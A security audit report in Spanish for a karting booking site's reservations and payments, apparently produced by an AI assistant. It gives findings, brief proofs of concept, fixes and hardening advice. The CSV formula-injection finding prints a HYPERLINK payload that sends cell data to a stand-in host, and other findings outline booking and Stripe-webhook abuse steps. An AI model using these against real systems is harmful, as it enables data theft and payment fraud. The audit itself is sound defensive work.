# Auditoría de seguridad · raceupkc.com (reservas y pagos)

Fecha: 14-11-2026 · Rama: `claude/raceup-karting-security-audit-1a3493` · Entorno de pruebas: rama de **desarrollo** de Neon
(nunca producción), con Stripe, Meta, YCloud y Claude simulados. Datos sintéticos, borrados al terminar.

## 1. Resumen

La base es sólida: el importe se fija en el servidor (`temporada.importe_reserva_cent`), los esquemas Zod son `.strict()`
(cualquier campo `importe` extra da 400), las firmas de Stripe y YCloud se validan en tiempo constante sobre el cuerpo en
bruto, los webhooks son idempotentes, los tokens son de 256 bits y solo se guarda su hash, el SQL está parametrizado (las
columnas dinámicas salen de listas blancas), el panel exige sesión + TOTP + fila en `admin`, y las cookies son
`HttpOnly`, `Secure` y `SameSite=Strict`.

Se han encontrado **1 alta, 6 medias y 9 bajas/informativas**. Las de severidad media o superior están corregidas y
verificadas, salvo dos que dependen de decisiones de negocio o de la infraestructura y quedan documentadas con su
mitigación (H4 y H8).

## 2. Superficie de ataque

Stack: Astro 7 estático + funciones de Vercel en `api/` (Node 22+, formato `Request → Response`), Neon Postgres
(`@neondatabase/serverless`), Better Auth 1.7 (panel), Stripe Checkout por API REST, Bizum manual, YCloud (WhatsApp),
Claude (bot y chat web), Vercel Blob privado.

| Endpoint | Quién | Protección |
|---|---|---|
| `GET /api/catalogo` | público | caché CDN 60 s |
| `POST/PATCH /api/solicitud` | público | Origin, límite por IP, campo trampa, token Bearer del borrador |
| `POST /api/checkout` | token del borrador | Origin, límite por IP |
| `GET /api/checkout/estado` | token del borrador | solo el token (256 bits); sin límite propio (ver §5, WAF) |
| `POST /api/stripe-webhook` | Stripe | firma `Stripe-Signature`, idempotencia `stripe_evento` |
| `POST /api/chat` | público | Origin, límite por IP **y global (nuevo)** |
| `POST /api/lead` | público (ya no lo usa la web) | **Origin y límites (nuevo)** |
| `/api/onboarding/*`, `/api/feedback/*` | token del enlace | límite por IP, 404 uniforme |
| `/api/feedback-anonimo/*` | público | límite global por ronda (sin IP, por anonimato) |
| `/api/grupo`, `/api/inscritos/imagen` | enlace firmado HMAC | firma antes de tocar la BD |
| `/api/wa/webhook` | YCloud | firma `YCloud-Signature`, idempotencia |
| `/api/cron`, `/api/wa/*` (cron), `/api/inscritos/semanal` | Vercel Cron | `CRON_SECRET` en tiempo constante |
| `/api/auth/*`, `/api/admin/*` | panel | Better Auth + TOTP + rol, Origin en POST |

Flujo de reserva: borrador (`POST /api/solicitud`) → datos (`PATCH`) → `POST /api/checkout` comprueba ronda y cupo y
abre la sesión de Stripe (30 min) o da el código Bizum → `checkout.session.completed` → `convertirSolicitud` crea
persona, pedido, inscripción, pago y onboarding en una transacción con `FOR UPDATE`.

## 3. Hallazgos

| # | Severidad | Hallazgo | Impacto en el negocio de reservas | Estado |
|---|---|---|---|---|
| H1 | **Alta** | Se podía cambiar ronda o categoría de una solicitud con el pago con tarjeta ya abierto | Plaza en una ronda o categoría **cerrada o llena** (sobreventa de karts, devoluciones, quejas) | Corregido y verificado |
| H2 | Media | Chat web sin tope global: el límite era solo por IP | Gasto en Claude sin techo con IPs rotativas (*denial of wallet*) | Corregido y verificado |
| H3 | Media | `/api/lead` aceptaba cualquier Lead sin Origin ni límite y lo reenviaba al píxel de Meta | Leads falsos estropean la optimización de las campañas (dinero de anuncios) | Corregido y verificado |
| H4 | Media | El consentimiento comercial de WhatsApp del formulario no verifica que el número sea de quien lo rellena | Se pueden apuntar números de terceros a los seguimientos C1/C2 → spam, quejas, baja de la calidad del número de WhatsApp | Documentado con mitigación |
| H5 | Media | El webhook de Stripe convertía cualquier sesión pagada con `client_reference_id`, sin comprobar metadatos ni importe | Un Payment Link (donde quien paga pone `client_reference_id` en la URL) o una sesión por menos importe marcaría una reserva como pagada | Corregido y verificado |
| H6 | Media | Inyección de fórmulas en los CSV del panel | Un nombre como `=HYPERLINK(...)` en el formulario público se ejecuta en el Excel de John y puede sacar datos de la hoja (teléfonos, DNI si se exportan sensibles) | Corregido y verificado |
| H8 | Media | DoS de aplicación contra la BD (plan Free de Neon: 100 CU-h/mes) | Tráfico constante a endpoints que tocan la BD la mantiene despierta y agota el cómputo → web y reservas caídas | Documentado: mitigación en infraestructura (§5) |
| H7 | Baja | Cada petición sin firma al webhook de WhatsApp escribía una fila en `evento` | Llenado de tablas y BD despierta sin límite (agrava H8) | Corregido y verificado |
| H9 | Baja | Se podía reservar una ronda con fecha pasada si seguía «programada» | Cobros por rondas ya celebradas si se olvida cerrar el cupo | Corregido |
| H10 | Baja | La comprobación de Origin aceptaba cualquier `*.vercel.app` | Sin efecto real (los endpoints usan token Bearer y las cookies del panel son `SameSite=Strict`), pero el filtro no filtraba | Corregido |
| H11 | Baja | Faltaban cabeceras: anti-*framing*, HSTS explícito, Permissions-Policy, CSP del panel | *Clickjacking* y menos defensa en profundidad ante un XSS | Corregido (pendiente de ver en el despliegue) |
| H12 | Baja | Dependencias con avisos (SCA) | Ver §3.1: ninguno explotable aquí | 2 corregidos, 2 documentados |
| H13 | Baja | Bloqueo del login por email tras 5 fallos; TOTP limitado solo por IP | Un tercero puede bloquear el acceso de John 15 min; con contraseña robada y muchas IPs, más intentos de TOTP | Documentado |
| H14 | Baja | Feedback anónimo/sorteo: límite global por ronda (300/10 min), sin IP por diseño | Se puede agotar el cupo de envíos o meter números falsos en el sorteo | Documentado (decisión de anonimato) |
| H15 | Info | El rol `operador` puede confirmar Bizum, abonar créditos y exportar listas | Riesgo interno si algún día hay operadores | Documentado |
| H16 | Info | Borradores masivos de solicitudes desde muchas IPs | Ruido en «Recuperar» y en la BD | Mitigación en infraestructura (§5) |

### H1 · Cambio de ronda/categoría con el pago abierto (Alta)

- **Causa.** `PATCH /api/solicitud` solo bloqueaba los datos de la reserva cuando el método era Bizum. Con tarjeta, tras
  `POST /api/checkout` (que comprueba el cupo) se podía cambiar `ronda_id` o `categoria_elegida`, y el webhook creaba la
  inscripción con los datos nuevos sin volver a mirar el cupo.
- **PoC (mínima).** Solicitud en R2/LIG con cupo abierto → `POST /api/checkout` (200, sesión abierta) →
  `PATCH /api/solicitud {campos:{ronda_id:<R3>, categoria_elegida:"PES"}}` con R3 **cerrada** → 200 → webhook pagado →
  inscripción en **R3 · PES · cupo cerrado**.
- **Fix.** `api/solicitud.js`: con el pago con tarjeta abierto (`checkout_expira_en` futuro) los datos de la reserva no se
  cambian (409, como con Bizum; el formulario ya abre una solicitud nueva con otro código, y su pago vuelve a comprobar el
  cupo). `api/checkout/index.js`: `checkout_expira_en` se fija dentro de la transacción, antes de pedir la sesión a
  Stripe (sin ventana de carrera), y se restaura si Stripe falla.
- **Verificación.** PoC repetida: PATCH → **409**, inscripción en R2 · LIG · abierta. Test nuevo en
  `db/tests/flujo-web.test.mjs` («tarjeta: con el pago abierto…»). El caso «ronda a null» ya lo paraba la restricción
  `solicitud_ronda` de la BD (antes 500, ahora 409).

### H2 · Chat web sin tope global (Media)

- **PoC.** 30 mensajes desde 30 `x-forwarded-for` distintos → 30 turnos de Claude (simulado).
- **Fix.** `lib/http.js` `dentroDelLimiteGlobal()` y `api/chat.js`: además del límite por IP, tope global de 60 mensajes
  cada 10 min y 400 al día (`CHAT_WEB_MAX_10MIN`, `CHAT_WEB_MAX_DIA`); al pasarlo, 429 con el botón de WhatsApp.
- **Verificación.** Con `CHAT_WEB_MAX_10MIN=10`: 30 peticiones → 10 turnos. Ajusta los topes al tráfico real y pon un
  límite de gasto mensual en la consola de Anthropic (§5).

### H3 · `/api/lead` abierto (Media)

- **PoC.** 5 `POST` sin Origin con emails inventados → 5 eventos `Lead` enviados a Meta.
- **Fix.** `api/lead.js`: Origin de nuestra web obligatorio, 5 cada 10 min por IP y 100 por hora en total, campos
  acotados y validados, sin devolver la respuesta de Meta. La web actual ya no la llama: **recomendación, borrarla**.
- **Verificación.** PoC → 403, 0 eventos. Test en `tests/seguridad.test.ts`.

### H4 · Consentimiento comercial sin verificar el número (Media · documentado)

Cualquiera puede rellenar el formulario con el WhatsApp de otra persona, marcar «novedades» y abrir el pago con tarjeta:
a las 2 h y a las 48 h esa persona recibe el seguimiento C1, y luego los avisos C2. El límite por IP (20/10 min) frena
el volumen, no el caso. No se ha cambiado porque afecta a la estrategia comercial y legal. **Mitigaciones propuestas,
de menos a más:** (1) C1 solo por texto libre si el contacto ya escribió (ventana de 24 h) y la plantilla solo con
`acepta_whatsapp_novedades`; (2) doble opt-in: el primer mensaje comercial pide responder «SÍ» y sin respuesta no hay
más; (3) tope de solicitudes por teléfono y día. Vigilar en YCloud la tasa de bloqueos/reportes del número.

### H5 · Webhook de Stripe sin comprobar origen ni importe de la sesión (Media)

- **PoC.** Evento firmado `checkout.session.completed` con `amount_total: 100` (1 €), sin `metadata` y con
  `client_reference_id` = una solicitud → solicitud **pagada**. Condición real: un Payment Link activo en la cuenta de
  Stripe (allí `client_reference_id` lo pone quien abre el enlace) o cualquier otra sesión creada fuera de `/api/checkout`.
- **Fix.** `api/stripe-webhook.js`: solo se convierten sesiones con `metadata[solicitud_id]` (lo pone el servidor),
  `client_reference_id` coherente, moneda EUR e importe ≥ reserva. Si no, el evento queda en `stripe_evento.error`
  como `REVISAR: …` y en el registro de Vercel; el cobro existe en Stripe y se gestiona a mano.
- **Verificación.** PoC → solicitud sigue «enviada». Test nuevo «webhook: una sesión sin metadata…».

### H6 · Inyección de fórmulas en CSV (Media)

- **PoC.** `pagador_nombre = =HYPERLINK("https://example.com/?x="&A1;"Ver")` → exportación CSV del embudo → la celda
  sale tal cual (las comillas no impiden que Excel la evalúe).
- **Fix.** `lib/csv.js` `celdaCsv()`: antepone `'` a lo que empiece por `=`, `@`, tabulador, retorno, o `+`/`-` seguido
  de algo que no sea un número o teléfono (los `+34 600…` y `-30` quedan intactos). Usado en `lib/panel/listas.js`,
  `feedback.js` y `feedback-anonimo.js`. Los XLSX (ExcelJS) ya guardan los textos como texto.
- **Verificación.** PoC → `'=HYPERLINK(…`. Test en `tests/seguridad.test.ts`.

### H7 · Firmas inválidas escritas en la BD (Baja)

PoC: 5 peticiones sin firma → 5 filas en `evento`. Fix (`api/wa/webhook.js`): solo `console.warn` en el registro de
Vercel. Verificado: 0 filas. Los tests del bot (27/27) pasan.

### H9 · Rondas con fecha pasada (Baja)

`api/solicitud.js` (`rondaValida`) y `api/checkout/index.js` exigen además `fecha >= hoy` (Madrid), igual que el
catálogo. **Recomendación:** decidir si el cierre del martes anterior (el que usa el bot, `martesAnterior`) debe
aplicarse también en el checkout; hoy depende de cerrar el cupo a mano.

### H10 · Orígenes permitidos (Baja)

`lib/http.js` `ORIGENES_WEB` (compartido con `lib/admin.js`): `raceupkc.com`, `www`, `raceupkc(-*)?.vercel.app`,
`rukc-pruebas.vercel.app` y `localhost`. Ya no vale cualquier `*.vercel.app`.

### H11 · Cabeceras (Baja)

`vercel.json`: en todo el sitio `Strict-Transport-Security: max-age=63072000`, `X-Frame-Options: DENY`,
`Content-Security-Policy: frame-ancestors 'none'; base-uri 'self'; object-src 'none'` y `Permissions-Policy`
(cámara, micro, ubicación, pago, USB desactivados; la foto del onboarding usa `<input type=file>`, no la API de cámara).
En `/admin*`, CSP completa: solo recursos propios, `connect-src 'self'`, `img-src 'self' data: blob:` (QR del TOTP y
fotos). Lleva `'unsafe-inline'` en scripts porque `/admin/entrar` tiene un script en línea que genera Astro.
**Pendiente:** comprobar en el despliegue de vista previa que el panel, el QR del TOTP y la web cargan sin errores de
CSP en la consola (Vercel no aplica estas cabeceras en `astro preview`).

### 3.1 · Dependencias (H12, SCA con `npm audit`)

| Paquete | Aviso | ¿Explotable aquí? | Acción |
|---|---|---|---|
| `zod` 4.1.11 (dentro de `@vercel/cli-config`) | alta, memoria con colecciones enormes | No: solo valida ficheros de configuración locales | Corregido: `overrides` → el `zod` 4.6.7 del proyecto |
| `fflate` 0.7.3 (dentro de `satori`) | moderada, bucle con ZIP64 malformado | No: satori no descomprime nada externo | Corregido: `overrides` → 0.7.5 (ya estaba en el lockfile) |
| `astro` 7.3.5 | moderada, XSS con nombres de etiqueta dinámicos; lectura en `@astrojs/node` | No: web estática, contenido del repo, sin adaptador Node | **Pendiente**: subir a ≥ 7.4.7 a partir del **20-11-2026** (las versiones corregidas tienen < 2 semanas; se espera por riesgo de cadena de suministro) y repetir `npm run build` + QA visual |
| `uuid` 8 (dentro de `exceljs`) | moderada, `v3/v5/v6` con `buf` | No: ExcelJS no usa esa ruta con datos externos | Aceptado; revisar cuando ExcelJS publique versión |

Resultado: de 9 avisos (4 altos) a 3 moderados no explotables. Los `overrides` no descargan código nuevo (el lockfile
solo pierde las copias anidadas). Sin secretos en el repositorio ni en el historial (búsqueda de claves de Stripe,
Anthropic, AWS, JWT y cadenas `postgres://` con contraseña); `.env*` está en `.gitignore`.

### Documentados sin cambio (H13–H16)

- **H13 · Login del panel.** Recomendado: bloqueo de TOTP también por usuario (no solo por IP) y aviso por WhatsApp a
  John tras N fallos; mantener la contraseña larga y única (gestor de contraseñas).
- **H14 · Sorteo.** Si importa la limpieza del sorteo, validar al elegir ganador que el WhatsApp corresponde a un piloto
  inscrito en esa ronda (sin romper el anonimato de las respuestas, que van en otra tabla).
- **H15 · Rol operador.** Si se crea alguno, limitar a `propietario` `personas/:id/creditos`, `canje`,
  `confirmar-bizum`, `pagos/:id/confirmar` y `exportar/*`.
- **H16 · Borradores masivos.** Ver §5 (Turnstile/BotID en el formulario).

## 4. Verificación y regresión

- PoC repetida sobre el código corregido (BD de desarrollo): H1, H3, H5, H6 y H7 ya no se reproducen; H2 corta en el tope.
- Manipulación de importes: `importe`, `importe_cent`, `unit_amount` en el checkout o `importe_reserva_cent` en la
  solicitud → 400 (esquemas `.strict()`); categoría inventada → 400. Reenvío del webhook → no duplica (test existente).
- `npm test`: **87/87**. Integración (`db:test`, BD de desarrollo): **79/80**; el que falla («fase 4 · C2 con 10
  contactos») falla igual en el código original sin tocar: depende de la hora a la que se ejecuta, no de esta auditoría.
  Bot (`tests/bot/webhook.test.mjs`): **27/27**. `npm run build`: correcto (30 páginas).
- El flujo de reserva completo (borrador → checkout tarjeta y Bizum → webhook → inscripción → onboarding → confirmación)
  sigue en verde en `db/tests/flujo-web.test.mjs`.
- Las PoC vivieron fuera del repo y se han borrado; en el repo solo quedan tests de regresión.

## 5. Hardening a nivel de infraestructura

Lo que no vive en el código y conviene hacer en las consolas:

1. **Vercel Firewall (WAF).** Reglas de *rate limiting* en el borde, antes de que la petición despierte la función y la BD
   (es la mitigación real de H8): por IP, p. ej. `/api/solicitud` 30/min, `/api/checkout` 10/min, `/api/chat` 20/min,
   `/api/onboarding*` y `/api/feedback*` 60/min, `/api/auth/*` 10/min; bloquear métodos no usados. Activar el modo
   *Attack Challenge* si hay un ataque. Activar **BotID** o Cloudflare **Turnstile** en `/inscripcion` y en el chat.
2. **Neon.** Vigilar el aviso del 70 % de CU-horas que ya manda la tarea `neon`; valorar un plan de pago o *autosuspend*
   corto y un límite de cómputo; usuario `rukc_app` con permisos mínimos (ya existe) y contraseñas rotadas al cambiar
   de equipo. Activar *IP Allow* si el plan lo permite (solo Vercel).
3. **Stripe.** Si quedan Payment Links de la landing antigua, desactivarlos (relacionado con H5); webhook limitado a los 4 eventos
   usados; clave restringida en producción (ya prevista) y alertas de Radar para pagos sospechosos; revisar en el panel
   los `stripe_evento` con `REVISAR`.
4. **Anthropic.** Límite de gasto mensual y aviso por email en la consola (techo final de H2); claves separadas para
   web y WhatsApp si se quiere cortar una sin la otra.
5. **YCloud / WhatsApp.** Vigilar la calidad del número y los bloqueos (H4); rotar `YCLOUD_WEBHOOK_SECRET` si se
   sospecha fuga.
6. **Cabeceras.** Comprobar en el despliegue las de H11 (securityheaders.com). Cuando todo esté estable, valorar
   `includeSubDomains; preload` en HSTS y una CSP para toda la web en modo `Report-Only` primero (Meta Pixel, YouTube y
   `lh3.googleusercontent.com`).
7. **Copias de seguridad.** Ya hay copia diaria cifrada (30 diarias, 12 mensuales) y *point-in-time restore* de Neon:
   hacer un ensayo de restauración trimestral (`npm run db:restaurar` sobre una rama temporal) y guardar la clave
   `RUKC_BACKUP_KEY` fuera de Vercel (gestor de contraseñas).
8. **Monitorización.** Log drain o alertas de Vercel para 5xx y 429 en `/api/*`, para `stripe-webhook revisar a mano` y
   `wa-webhook firma no válida`; alerta de presupuesto en Vercel.
9. **Cuentas.** 2FA en Vercel, GitHub, Stripe, Neon, YCloud, Anthropic y Google; revisar miembros con acceso; Deployment
   Protection en las vistas previas (ya activa).
10. **Dependencias.** Activar Dependabot/Renovate con espera mínima de 2 semanas para versiones nuevas y `npm audit` en
    CI; subir Astro (§3.1) a partir del 20-11-2026.

## 6. Archivos cambiados

`api/solicitud.js`, `api/checkout/index.js`, `api/stripe-webhook.js`, `api/chat.js`, `api/lead.js`, `api/wa/webhook.js`,
`lib/http.js`, `lib/admin.js`, `lib/csv.js` (nuevo), `lib/panel/listas.js`, `lib/panel/feedback.js`,
`lib/panel/feedback-anonimo.js`, `vercel.json`, `package.json`, `package-lock.json`, `.env.example`,
`db/tests/flujo-web.test.mjs`, `tests/seguridad.test.ts` (nuevo).

Despliegue: no hay migraciones. Basta con fusionar y desplegar; opcionalmente definir `CHAT_WEB_MAX_10MIN` y
`CHAT_WEB_MAX_DIA` en Vercel (si no, 60 y 400).
